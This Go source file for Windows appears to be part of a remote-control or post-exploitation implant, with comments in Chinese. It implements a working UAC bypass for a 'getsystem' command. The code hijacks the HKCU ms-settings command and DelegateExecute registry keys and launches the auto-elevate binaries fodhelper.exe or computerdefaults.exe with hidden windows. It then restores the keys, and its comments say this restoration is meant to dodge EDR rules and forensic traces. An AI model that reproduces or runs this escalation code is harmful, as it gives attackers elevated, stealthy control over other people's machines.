//go:build windows

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

// ===== UAC 绕过（getsystem 的 uac 路径）=====
//
// 原理：`fodhelper.exe` / `computerdefaults.exe` 是 Windows 自带的 **auto-elevate**
// 程序（清单里声明 requireAdministrator），启动时不需要 UAC 提示。它们会去
// HKCU\Software\Classes\ms-settings\shell\open\command 读"打开设置页"的命令行 ——
// 而这个位置**普通用户可写且优先级高于系统默认值**，于是形成一条提权路径：
//
//	写 HKCU 劫持键 → 启动 auto-elevate 宿主（高完整性）→ 宿主按我们写的命令行拉起进程
//
// 为什么选它：不需要 SeImpersonate、不需要已提权进程，是"普通管理员组成员 + UAC 开启"
// 场景下唯一不依赖其它前提的路径。
//
// 为什么必须还原：劫持键是可被取证/被 EDR 规则命中的持久改动。派生后立刻恢复原值
// （原本不存在则删除整棵子树），并把结果写进回执；`getsystem uac_cleanup` 提供手动兜底。
const (
	uacHijackBase = `Software\Classes\ms-settings\shell\open\command`
	// delegate_execute 是这条路径的关键：没有它，宿主不会按我们的命令行执行
	uacDelegateKey = `Software\Classes\ms-settings\shell\open\command\DelegateExecute`
)

// uacHosts UAC 劫持可用的 auto-elevate 宿主
var uacHosts = []string{"fodhelper.exe", "computerdefaults.exe"}

// checkUACPreconditions 提前判定"这条路径有没有可能成功"。
// 目的是不做无谓动作：不写注册表、不拉进程，直接给出可读原因。
func checkUACPreconditions() error {
	// 1) 当前用户必须在管理员组（否则提权后也是普通用户，没有意义）
	if !currentUserInAdministrators() {
		return fmt.Errorf("当前用户不在 Administrators 组，UAC 宿主拉起的进程不会有更高权限")
	}

	// 2) UAC 必须开启：EnableLUA=0 时进程本就该是高完整性（会先走 already 判定）
	if !uacEnabled() {
		return fmt.Errorf("UAC 已关闭（EnableLUA=0），该路径无意义")
	}
	return nil
}

// uacEnabled 读 HKLM\...\Policies\System\EnableLUA
func uacEnabled() bool {
	val, err := readRegDWORD(`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "EnableLUA")
	if err != nil {
		// 读不到时按"开启"处理：让后续流程自己失败并给出真实错误，而不是在这里拦死
		return true
	}
	return val != 0
}

// currentUserInAdministrators 当前令牌的组里是否有 Administrators（S-1-5-32-544）
func currentUserInAdministrators() bool {
	// 用 net localgroup 判定会受本地化影响，这里走令牌组查询（与 whoami /groups 同源）
	cmd := exec.Command("whoami", "/groups")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
	out, err := cmd.Output()
	if err != nil {
		return false
	}
	low := strings.ToLower(string(out))
	// 本地化环境下 SID 是稳定标识
	return strings.Contains(low, "s-1-5-32-544")
}

// uacHijack 写入劫持键，返回一个**幂等**的还原函数。
//
// 还原语义：写之前记录原值 —— 原本有值就写回，原本没有就删掉整棵子树。
// 这样无论目标机此前是什么状态，清理后都回到原样。
func uacHijack(host, commandLine string) (func() error, error) {
	return uacHijackWith(uacHijackBase, uacDelegateKey, commandLine)
}

// uacHijackWith 与 uacHijack 同逻辑，但键路径可注入 —— 单测用隔离的临时键验证
// "写 → 还原 → 幂等"这套语义，绝不触碰真实的 ms-settings 键（那会影响开发机上
// 输入法/设置页的行为）。
func uacHijackWith(hijackBase, delegateKey, commandLine string) (func() error, error) {
	prevCommand, hadCommand := readRegString(hijackBase, "")
	_, hadDelegate := readRegString(delegateKey, "")

	if err := writeRegString(hijackBase, "", commandLine); err != nil {
		return nil, fmt.Errorf("写入劫持键失败: %w", err)
	}
	// DelegateExecute 必须存在（值本身可以为空）—— 缺失时宿主不会执行我们的命令行
	if err := writeRegString(delegateKey, "", ""); err != nil {
		_ = restoreRegValue(hijackBase, "", prevCommand, hadCommand)
		return nil, fmt.Errorf("写入 DelegateExecute 失败: %w", err)
	}

	restore := func() error {
		var errs []string
		if err := restoreRegValue(hijackBase, "", prevCommand, hadCommand); err != nil {
			errs = append(errs, err.Error())
		}
		// DelegateExecute：原本没有就删掉（值删空即可，键留着无害）
		if !hadDelegate {
			if err := deleteRegValue(delegateKey, ""); err != nil {
				errs = append(errs, err.Error())
			}
		}
		if len(errs) > 0 {
			return fmt.Errorf("%s", strings.Join(errs, "; "))
		}
		return nil
	}
	return restore, nil
}

// uacTrigger 启动 auto-elevate 宿主。宿主自己会以高完整性启动并按劫持键拉起我们的进程。
func uacTrigger(host string) (uint32, error) {
	hostPath := system32Path(host)
	cmd := exec.Command(hostPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
	if err := cmd.Start(); err != nil {
		return 0, fmt.Errorf("启动 %s 失败: %w", host, err)
	}
	pid := uint32(cmd.Process.Pid)
	// 宿主的生命周期很短（拉起目标进程后自己退出），这里不 Wait：
	// 拿到 PID 就够了，回执里给操作员核对用。
	_ = cmd.Process.Release()
	return pid, nil
}

// uacCleanup 清掉劫持残留（不依赖内存状态，供 `getsystem uac_cleanup` 用）。
// 参数是"要检查的劫持键路径"，便于测试用隔离的临时键自证 ——
// 测试绝不该去碰真实的 ms-settings 键，否则会污染开发机上的输入法/设置行为。
func uacCleanup(hijackBase, delegateKey string) (removed []string, err error) {
	var errs []string
	// 判定"有没有残留"：键存在且值非空
	if v, ok := readRegString(hijackBase, ""); ok && strings.TrimSpace(v) != "" {
		if hard, err := deleteRegKeyTree(settingsRootOf(hijackBase)); err != nil {
			errs = append(errs, err.Error())
		} else if hard {
			removed = append(removed, hijackBase)
		} else {
			removed = append(removed, hijackBase+"（已清空劫持值）")
		}
	}
	if _, ok := readRegString(delegateKey, ""); ok {
		if hard, err := deleteRegKeyTree(settingsRootOf(hijackBase)); err != nil {
			errs = append(errs, err.Error())
		} else if hard && len(removed) == 0 {
			removed = append(removed, delegateKey)
		}
	}
	if len(errs) > 0 {
		return removed, fmt.Errorf("%s", strings.Join(errs, "; "))
	}
	return removed, nil
}

// settingsRootOf 从劫持键路径推出"要整棵删掉的子树根"（ms-settings）
func settingsRootOf(hijackBase string) string {
	const marker = `\ms-settings`
	if i := strings.Index(hijackBase, marker); i >= 0 {
		return hijackBase[:i+len(marker)]
	}
	return hijackBase
}

// uacCleanupReport 组装 uac_cleanup 的回执
func uacCleanupReport() ([]byte, error) {
	removed, err := uacCleanup(uacHijackBase, uacDelegateKey)
	if err != nil {
		return nil, fmt.Errorf("清理 UAC 劫持残留失败: %w", err)
	}
	if len(removed) == 0 {
		return []byte("[+] 无 UAC 劫持残留（HKCU 下未发现劫持键）"), nil
	}
	return []byte(fmt.Sprintf("[+] 已清理 UAC 劫持残留: %s", strings.Join(removed, ", "))), nil
}

// system32Path 取 System32 下的绝对路径（劫持键里也要用绝对路径，避免受 PATH 影响）
func system32Path(name string) string {
	root := getSystemRoot()
	return root + `\System32\` + name
}

func getSystemRoot() string {
	if root := os.Getenv("SystemRoot"); root != "" {
		return root
	}
	return `C:\Windows`
}

// ===== 注册表薄封装（HKCU/HKLM 只读）=====
//
// 用 x/sys/windows/registry：syscall 包在 Windows 上并不导出 RegCreateKeyEx / RegSetValueEx
// 这些函数（只有 RegOpenKeyEx/RegQueryValueEx），自己走 proc.Call 拼一遍既啰嗦又容易错。

// deleteRegKeyTree 删 HKCU 下一棵子树；**删不掉时退化为"清空劫持值"**。
//
// 两个必须知道的细节：
//
//  1. `RegDeleteKeyW` **不是递归的**。带子键的键会直接返回 ERROR_ACCESS_DENIED
//     （实测确认；这一点很容易被想当然地写错，注释里特意留档）。所以这里自己
//     深度优先清子键，再删本键。
//  2. 劫持的实质危害是"那个命令行值还在"。极端受限环境里连删值都被拒时，
//     至少要把值清空 —— 留下可用的劫持比"报告失败"危险得多。
//
// 返回值 hardDeleted=false 表示走的是退化路径（键可能残留但值已失效），
// 让回执能如实告知操作员"未必删干净"。
func deleteRegKeyTree(subKey string) (hardDeleted bool, err error) {
	if derr := removeKeyRecursive(subKey); derr == nil {
		return true, nil
	} else if derr == registry.ErrNotExist {
		return true, nil // 键本来就没有 = 已清理
	} else {
		err = derr
	}
	// 退化：清空劫持键里的命令行值（键还在但已失效）
	if cerr := clearHijackValues(subKey); cerr != nil {
		return false, fmt.Errorf("删除键失败(%v)，清空劫持值也失败(%v)", err, cerr)
	}
	return false, nil
}

// removeKeyRecursive 深度优先删除 HKCU 下一棵子树（RegDeleteKeyW 只删单层且要求无子键）
func removeKeyRecursive(subKey string) error {
	parent, leaf := splitRegKey(subKey)
	pk, err := registry.OpenKey(registry.CURRENT_USER, parent, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer pk.Close()

	// 先看有没有子键：有就逐个递归（用 ENUMERATE_SUB_KEYS 权限重新打开）
	if ck, cerr := registry.OpenKey(registry.CURRENT_USER, subKey, registry.ENUMERATE_SUB_KEYS); cerr == nil {
		names, _ := ck.ReadSubKeyNames(256)
		ck.Close()
		for _, name := range names {
			if rerr := removeKeyRecursive(subKey + `\` + name); rerr != nil && rerr != registry.ErrNotExist {
				return rerr
			}
		}
	}
	return registry.DeleteKey(pk, leaf)
}

// clearHijackValues 把劫持键下的关键值置空（Neutralize 而不是 Delete）
func clearHijackValues(hijackBase string) error {
	if err := writeRegString(hijackBase, "", ""); err != nil {
		return err
	}
	// DelegateExecute 也去掉：留着它 + 空命令行不会拉起任何东西，但删掉更干净
	return deleteRegValue(hijackBase+`\DelegateExecute`, "")
}

// readRegString 读 HKCU 下一个字符串值
func readRegString(subKey, name string) (string, bool) {
	k, err := registry.OpenKey(registry.CURRENT_USER, subKey, registry.QUERY_VALUE)
	if err != nil {
		return "", false
	}
	defer k.Close()
	v, _, err := k.GetStringValue(name)
	if err != nil {
		return "", false
	}
	return v, true
}

// writeRegString 写 HKCU 下一个字符串值（键不存在则创建）
func writeRegString(subKey, name, value string) error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER, subKey, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer k.Close()
	return k.SetStringValue(name, value)
}

// deleteRegValue 删一个值；键或值本来就不存在时视为成功（幂等）
func deleteRegValue(subKey, name string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, subKey, registry.SET_VALUE)
	if err != nil {
		return nil // 键不存在 = 已经是干净状态
	}
	defer k.Close()
	if err := k.DeleteValue(name); err != nil && err != registry.ErrNotExist {
		return err
	}
	return nil
}

// splitRegKey 把 "Software\Classes\ms-settings" 拆成 ("Software\Classes", "ms-settings")
func splitRegKey(path string) (string, string) {
	idx := strings.LastIndex(path, `\`)
	if idx < 0 {
		return "", path
	}
	return path[:idx], path[idx+1:]
}

// restoreRegValue 还原到"写之前的状态"：原来有值就写回，原来没有就删掉这个值
func restoreRegValue(subKey, name, prev string, had bool) error {
	if had {
		return writeRegString(subKey, name, prev)
	}
	return deleteRegValue(subKey, name)
}

// readRegDWORD 读一个 REG_DWORD（HKLM，只读）
func readRegDWORD(subKey, name string) (uint32, error) {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, subKey, registry.QUERY_VALUE)
	if err != nil {
		return 0, err
	}
	defer k.Close()
	v, _, err := k.GetIntegerValue(name)
	if err != nil {
		return 0, err
	}
	return uint32(v), nil
}
